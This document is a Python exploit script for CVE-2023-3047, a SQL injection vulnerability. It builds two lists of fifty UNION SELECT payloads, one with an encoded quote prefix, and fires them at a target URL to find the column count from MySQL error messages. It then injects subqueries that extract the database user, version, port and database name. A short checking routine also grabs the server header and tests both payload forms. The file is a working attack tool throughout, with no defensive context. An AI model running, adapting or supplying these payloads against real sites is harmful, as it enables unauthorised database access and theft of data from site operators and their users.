import requests
import time
import re

def exploit_cve_2023_3047(url):
    payload_1 = [
        '+Union Select 1--+-',
        '+Union Select 1,2--+-',
        '+Union Select 1,2,3--+-',
        '+Union Select 1,2,3,4--+-',
        '+Union Select 1,2,3,4,5--+-',
        '+Union Select 1,2,3,4,5,6--+-',
        '+Union Select 1,2,3,4,5,6,7--+-',
        '+Union Select 1,2,3,4,5,6,7,8--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49--+-',
        '+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50--+-'
    ]
    
    num = 0
    for payload1 in payload_1:
        print("[+] Testing Payload", payload1)
        num += 1
        exploit = requests.get(url + "%27")
        if "at line" in exploit.text:
            exploit = requests.get(url + payload1)
            if exploit.status_code == 200:
                if "The used SELECT" in exploit.text:
                    pass
                else:
                    print("[+] Found num :", num)
                    print("[+] Payload 1 :", payload1)
                    count = num
                    n = [ count for count in range(0, count+1) ]
                    for num in n:
                        payload_test = "(select group_concat(user(),'::',version()))"
                        payload = re.sub(r"\b{}\b".format(str(num)), payload_test, payload1)
                        exploit = requests.get(url + payload)
                        source_html = exploit.text
                        print(f"[+] Checking URL {url}{payload}")
                        if str(num) and "::" in source_html:
                            print("[+] Number Not Valid :", num)
                            payload_get = "(select group_concat(user(),'::',@@port))"
                            payload = re.sub(r'\b{}\b'.format(str(num)), payload_get, payload1)
                            print("[+] Testing Payload :", payload)
                            exploit = requests.get(url + payload)
                            source = exploit.text
                            check = r"\b\w+@\b\w+::\b"
                            fetching = re.findall(check, source)
                            for get in fetching:
                                data = get.replace("::", "")
                                print("-------------------------")
                                print("User MySQL :", data)
                                payload_get_dbs = "(select group_concat(database(),'::',version()))"
                                payload = re.sub(r"\b{}\b".format(str(num)), payload_get_dbs, payload1)
                                exploit = requests.get(url + payload)
                                html = exploit.text
                                check = r"\b\w+::\b"
                                fetching = re.findall(check, html)
                                for dbs in fetching:
                                    dbs = dbs.replace("::", "")
                                    print("database name : information_schema")
                                    print("database name :", dbs)
                                    print("[+] Target Is Vulnerable SQL Injection - CVE-2023-3047")
                                    exit("-------------------------")
                        else:
                            pass
            else:
                exit('Server not Accept')
        else:
            print("[+] Testing Payload 2")
            

def exploit_cve_2023_3047_2(url):
    payload_2 = [
        '%27+Union Select 1--+-',
        '%27+Union Select 1,2--+-',
        '%27+Union Select 1,2,3--+-',
        '%27+Union Select 1,2,3,4--+-',
        '%27+Union Select 1,2,3,4,5--+-',
        '%27+Union Select 1,2,3,4,5,6--+-',
        '%27+Union Select 1,2,3,4,5,6,7--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49--+-',
        '%27+Union Select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50--+-'
    ]
    num = 0
    for payload2 in payload_2:
        num += 1
        exploit = requests.get(url + "%27")
        if "at line" in exploit.text:
            exploit = requests.get(url + payload2)
            if exploit.status_code == 200:
                if "The used SELECT" in exploit.text:
                    pass
                else:
                    print("[+] Found num :", num)
                    print("[+] Payload 1 :", payload2)
                    count = num
                    n = [ count for count in range(0, count+1) ]
                    for num in n:
                        payload_test = "(select group_concat(user(),'::',version()))"
                        payload = re.sub(r"\b{}\b".format(str(num)), payload_test, payload2)
                        exploit = requests.get(url + payload)
                        source_html = exploit.text
                        print(f"[+] Checking URL {url}{payload}")
                        if str(num) and "::" in source_html:
                            print("[+] Number Not Valid :", num)
                            payload_get = "(select group_concat(user(),'::',@@port))"
                            payload = re.sub(r'\b{}\b'.format(str(num)), payload_get, payload2)
                            print("[+] Testing Payload :", payload)
                            exploit = requests.get(url + payload)
                            source = exploit.text
                            check = r"\b\w+@\b\w+::\b"
                            fetching = re.findall(check, source)
                            for get in fetching:
                                data = get.replace("::", "")
                                print("-------------------------")
                                print("User MySQL :", data)
                                payload_get_dbs = "(select group_concat(database(),'::',version()))"
                                payload = re.sub(r"\b{}\b".format(str(num)), payload_get_dbs, payload2)
                                exploit = requests.get(url + payload)
                                html = exploit.text
                                check = r"\b\w+::\b"
                                fetching = re.findall(check, html)
                                for dbs in fetching:
                                    dbs = dbs.replace("::", "")
                                    print("database name : information_schema")
                                    print("database name :", dbs)
                                    print("[+] Target Is Vulnerable SQL Injection - CVE-2023-3047")
                                    exit("-------------------------")
        else:
            pass

def checking(url):
    class checkings:
        def __init__(self, url):
            get_ver = requests.get(url)
            service = get_ver.headers.get('server')
            print("[+] Service :", service)
            self.payload = '%27'
            self.exploit = requests.get(url + self.payload)
            self.response = self.exploit.text
            if "at line" in self.response:
                print("[+] Testing Payload Select...")
                self.payload = "+Union+Select+1,2,3--+-"
                self.exploit = requests.get(url + self.payload)
                if "The used SELECT" in self.exploit.text:
                    print("[+] Site Is Vulnerable CVE-2023-3047")
                    print("[+] Payload 1 :", self.payload)
                    print("[+] Starting Exploit With Payload Union Select")
                else:
                    print("[+] Exploit Failed")
                    print("[+] Starting Exploit With Payload 2...")
                    self.payload = "%27+Union+Select+1,2,3--+-"
                    self.exploit = requests.get(url + self.payload)
                    if "The used SELECT" in self.exploit.text:
                        print("[+] Site Is Vulnerable CVE-2023-3047")
                        print("[+] Payload 2 :", self.payload)
                        print("[+] Starting Exploit With Payload Union Select")
                    else:
                        print("[-] Website Not Vulnerable")
    checkings(url)